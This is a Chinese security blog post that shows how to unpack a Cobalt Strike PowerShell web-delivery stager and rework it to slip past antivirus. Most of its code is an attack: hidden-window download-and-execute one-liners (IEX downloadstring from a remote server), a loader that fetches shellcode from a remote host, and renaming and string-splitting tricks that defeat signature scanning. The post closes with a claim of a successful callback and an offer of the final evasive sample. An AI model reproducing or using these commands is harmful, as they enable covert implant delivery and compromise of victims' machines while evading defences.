> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2toasPU-tFPDxsKfFbws4w)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GfKibgI50Gda4Fev6F6pN0xZARHT0ibjOV00HFQoWX2m8b14hYiaCh2rvA/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

分析 PowerShell 命令  

Powershell 无文件上线，使用 CS 的 scripted web delivery 生成 powershell 脚本，挂在服务器上  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11G1e9d3gKJnwHia1cjib5GMEjtwY9LG2w1bJxQV4ono8PfkpcrqibZXYG6A/640?wx_fmt=png)

CS 会生成一句 powershell 命令，并将 ps 脚本挂在 CS 服务器上  

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1:80/a'))"
```

看看访问的 http://192.168.1.1:80/a 文件有什么

发现是一大串 PS 命令，它先使用 base64 解码，之后通过 IO.MemoryStream.GzipStream 解压缩，得到解码后的 PS 脚本，并 IEX 执行该脚本

```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("vbxH516NOyTVgUA......."));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GficmNRXjpzbPv43icHe5ibJUrrzaXkiaLQwMBE7AZg2iaIXcot0JwianXpiag/640?wx_fmt=png)

输出一下解码后的脚本，修改 IEX 为 echo，就可输出源代码了  

```
powershell -ExecutionPolicy bypass -File power.ps1 >> source.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GIK8JljD5XyYGkeAdvtEGhTSYAS5XPsbE3fQ43Nx2XPjTDu3xMRTJXA/640?wx_fmt=png)

分析 PowerShell 加载器

仔细观察源代码啊，发现这就是 CS 直接生成的 powershell 的 payload 啊。  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GFAJribRL8tP6ofrDib3mNPYJUqDf3XKqOicshMdwY5ibzicN8MOorbVnpqQ/640?wx_fmt=png)

有两个函数 fungetprocaddress 和 functiongetdelegatetype，然后一个 base64 解码，并进行 xor 异或处理得到 shellcode，分配内存，复制 shellcode 到内存，最后执行 shellcode

就是一个典型的 powershell 版本 shellcode 加载器

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11G2qhJDicXuu156Du2t2WUHTshBrX8MiaZegHRFibv68vFZpY8ma7oJCrIw/640?wx_fmt=png)

这里的 base64 编码的一大串内容，盲猜就是 shellcode 异或处理又 base64 编码来的  

既然这样就输出一下解码后得到的 16 进制机器码

```
echo $var_code >> shellcode.bin
```

暂时看不太懂机器码。。。  

既然是内存加载器，就改一下加载器

不将 shellcode 写死在 ps 脚本中，而是将 shellcode 放在服务器上，远程加载实现分离免杀

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11Gz525c7ibtvk0symjqvicaF8kE2QW2xLicCQn4EW3pj1IosFXXTcaGU5eg/640?wx_fmt=png)

```
[Byte[]]$var_code = (New-Object Net.WebClient).downloaddata('http://192.168.1.1/payload.bin')
```

这里的 bin 文件用 CS 或 msf 生成的都可以，其他代码不改，先尝试一下能上线不。

   **测试免杀**

能上线后就修改一下 ps 脚本的其他特征。  

```
func_get_delegate_type函数重命名为function func_ttt
func_get_proc_address函数重命名为func_hhh
downloaddata函数改为"down`lo`addata"
downloadstring函数改为"download`str`ing"
'Invoke'字符串改为为'Inv'+'oke'
$var_code变量为$var_dode
'http://192.168.1.1/payload.bin'改为'ht'+'tp://192.16'+'8.1.1/pay'+'load.bin'
```

反正能改的都改改，测试一下最终 ps 脚本，能上线，然后查杀一下该脚本  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GXuK4KiczN8BFAKVLhxdgJIYg0s0ib1Vy4B24blyWBX6iaK7NVAG5OepfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNrPAYfgu9AuiaLbLHBQr11GCicU1oPkQzO2mLibBI2sRSLZQ5Vr6UGBibrhUEVKzRyq1n4NxPZxEheuw/640?wx_fmt=png)

主机上线

使用的话将脚本上传目标主机，或者放在服务器上加载即可  

```
powershell -nop -w hidden -c "IEX(new-object net.webclient).downloadstring('C:\test.ps1')"
```

```
powershell -nop -w hidden -c "IEX(new-object net.webclient).downloadstring('http://192.168.1.1/test.ps1')"
```

最终样本可在公众号回复：ps 免杀样本  

**【往期推荐】**  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)  
**

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)